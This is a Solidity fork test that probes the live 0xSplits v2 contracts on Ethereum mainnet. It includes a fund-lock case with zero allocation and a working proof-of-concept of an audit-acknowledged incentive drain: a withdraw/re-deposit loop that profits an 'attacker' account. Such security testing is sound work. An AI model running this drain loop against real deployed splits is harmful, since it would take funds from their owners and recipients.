// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.23;

import { Test } from "forge-std/Test.sol";

import { SplitsWarehouse } from "src/SplitsWarehouse.sol";
import { SplitV2Lib } from "src/libraries/SplitV2.sol";
import { PullSplitFactory } from "src/splitters/pull/PullSplitFactory.sol";
import { PushSplitFactory } from "src/splitters/push/PushSplitFactory.sol";
import { Wallet } from "src/utils/Wallet.sol";

interface IPushSplit {
    function distribute(SplitV2Lib.Split calldata _split, address _token, address _distributor) external;
    function distribute(
        SplitV2Lib.Split calldata _split,
        address _token,
        uint256 _distributeAmount,
        bool _performWarehouseTransfer,
        address _distributor
    )
        external;
    function withdrawFromWarehouse(address _token) external;
    function execCalls(Wallet.Call[] calldata _calls) external payable returns (uint256, bytes[] memory);
    function owner() external view returns (address);
}

interface IPullSplit {
    function depositToWarehouse(address _token, uint256 _amount) external;
}

/// @notice Fork checks against the LIVE 0xSplits deployment on Ethereum mainnet.
/// @dev Drop into `packages/splits-v2/test/SplitsV2Fork.t.sol`:
///      forge test --match-path test/SplitsV2Fork.t.sol -vv
///      Native ETH is used on purpose (the warehouse wraps it under the ERC-7528 sentinel),
///      so no token storage has to be faked on the fork.
contract SplitsV2ForkTest is Test {
    // mainnet, packages/splits-v2/deployments/1.json @ 0159376
    address constant WAREHOUSE = 0x8fb66F38cF86A3d5e8768f8F1754A24A6c661Fb8;
    address constant PULL_FACTORY = 0x6B9118074aB15142d7524E8c4ea8f62A3Bdb98f1; // V2.2
    address constant PUSH_FACTORY = 0x8E8eB0cC6AE34A38B67D5Cf91ACa38f60bc3Ecf4; // V2.2
    address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    SplitsWarehouse warehouse = SplitsWarehouse(payable(WAREHOUSE));

    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC"));
        vm.deal(attacker, 1 ether); // gas money only, no working capital
    }

    // ------------------------------------------------------------------ helpers

    function _nativeId() internal pure returns (uint256) {
        return uint256(uint160(NATIVE));
    }

    function _split(uint16 incentive) internal view returns (SplitV2Lib.Split memory s) {
        s.recipients = new address[](2);
        s.recipients[0] = alice;
        s.recipients[1] = bob;
        s.allocations = new uint256[](2);
        s.allocations[0] = 3;
        s.allocations[1] = 1;
        s.totalAllocation = 4;
        s.distributionIncentive = incentive;
    }

    function _one(address a) internal pure returns (address[] memory r) {
        r = new address[](1);
        r[0] = a;
    }

    function _one(uint256 a) internal pure returns (uint256[] memory r) {
        r = new uint256[](1);
        r[0] = a;
    }

    // ------------------------------------------------------------------ tests

    /// @notice A zero-privilege EOA must not be able to take anything out of the live system.
    function test_fork_noFreeMoney() public {
        SplitV2Lib.Split memory s = _split(0);
        bytes32 salt = bytes32(uint256(1));

        address wallet = PushSplitFactory(PUSH_FACTORY).predictDeterministicAddress(s, owner, salt);
        PushSplitFactory(PUSH_FACTORY).createSplitDeterministic(s, owner, owner, salt);
        assertGt(wallet.code.length, 0, "split deployed by the live factory");

        vm.deal(address(this), 5 ether);
        warehouse.deposit{ value: 5 ether }(wallet, NATIVE, 5 ether);
        assertEq(warehouse.balanceOf(wallet, _nativeId()), 5 ether, "ledger funded");

        uint256 start = attacker.balance;
        uint256 startLedger = warehouse.balanceOf(attacker, _nativeId());

        vm.startPrank(attacker, attacker);

        // 1. permissionless, moves the ledger into the wallet (never to the caller)
        warehouse.withdraw(wallet, NATIVE);

        // 2. incentive route: only 1 wei is left in the ledger, so asking for 1 ether reverts
        //    (and even at the full balance the reward is 0 while withdrawConfig.incentive == 0)
        try warehouse.withdraw(wallet, _one(NATIVE), _one(uint256(1 ether)), attacker) {
            revert("withdraw must not over-burn");
        } catch { }

        // 3. no allowance -> must revert
        try warehouse.transferFrom(wallet, attacker, _nativeId(), 1 ether) {
            revert("transferFrom must not succeed");
        } catch { }

        // 4. no balance -> must revert
        try warehouse.batchTransfer(_one(attacker), NATIVE, _one(uint256(1 ether))) {
            revert("batchTransfer must not succeed");
        } catch { }

        // 5. execCalls is owner only -> must revert
        Wallet.Call[] memory calls = new Wallet.Call[](1);
        calls[0] = Wallet.Call({ to: attacker, value: 1 ether, data: "" });
        try IPushSplit(wallet).execCalls(calls) {
            revert("execCalls must not succeed");
        } catch { }

        vm.stopPrank();

        assertEq(warehouse.balanceOf(attacker, _nativeId()), startLedger, "no ledger balance gained");
        assertEq(attacker.balance, start, "no ETH gained");
        assertEq(warehouse.balanceOf(wallet, _nativeId()) <= 1, true, "funds only moved to their own owner");
    }

    /// @notice `validate()` accepts totalAllocation == 0, then distribute() always reverts with
    ///         panic 0x12 (division by zero): a funded wallet nobody can ever distribute.
    function test_fork_zeroTotalAllocationLocksFunds() public {
        SplitV2Lib.Split memory s;
        s.recipients = new address[](2);
        s.recipients[0] = alice;
        s.recipients[1] = bob;
        s.allocations = new uint256[](2); // [0, 0]
        s.totalAllocation = 0;
        s.distributionIncentive = 0;

        bytes32 salt = bytes32(uint256(2));
        address wallet = PushSplitFactory(PUSH_FACTORY).predictDeterministicAddress(s, owner, salt);
        PushSplitFactory(PUSH_FACTORY).createSplitDeterministic(s, owner, owner, salt);
        assertGt(wallet.code.length, 0, "the live factory accepts totalAllocation = 0");

        vm.deal(wallet, 1 ether);
        emit log_named_uint("wallet ETH balance after funding", wallet.balance);

        vm.prank(attacker);
        try IPushSplit(wallet).distribute(s, NATIVE, attacker) {
            revert("distribute must not succeed");
        } catch { }

        assertEq(wallet.balance, 1 ether, "funds are still inside and undistributable");
    }

    /// @notice The pull-split incentive drain the audit acknowledged (H-01 variant) is live on
    ///         mainnet: it needs the split owner to set a warehouse withdrawal incentive.
    function test_fork_acknowledgedPullIncentiveDrain() public {
        SplitV2Lib.Split memory s = _split(0);
        bytes32 salt = bytes32(uint256(3));

        address wallet = PullSplitFactory(PULL_FACTORY).predictDeterministicAddress(s, owner, salt);
        PullSplitFactory(PULL_FACTORY).createSplitDeterministic(s, owner, owner, salt);

        vm.deal(wallet, 10 ether);
        vm.prank(wallet);
        warehouse.deposit{ value: 10 ether }(wallet, NATIVE, 10 ether);

        // the acknowledged premise: the owner opts in to a 1% warehouse withdrawal incentive
        SplitsWarehouse.WithdrawConfig memory cfg = SplitsWarehouse.WithdrawConfig({ incentive: 10_000, paused: false });
        vm.prank(wallet);
        warehouse.setWithdrawConfig(cfg);

        uint256 start = attacker.balance;
        vm.startPrank(attacker, attacker);
        for (uint256 i; i < 40; ++i) {
            uint256 wb = warehouse.balanceOf(wallet, _nativeId());
            if (wb <= 1) break;
            warehouse.withdraw(wallet, _one(NATIVE), _one(wb), attacker);
            uint256 inWallet = wallet.balance;
            if (inWallet > 0) {
                try IPullSplit(wallet).depositToWarehouse(NATIVE, inWallet) { }
                catch { break; }
            }
        }
        vm.stopPrank();

        emit log_named_uint("attacker profit after 40 cycles (wei)", attacker.balance - start);
        assertGt(attacker.balance, start, "acknowledged drain reproduces on the live warehouse");
    }
}
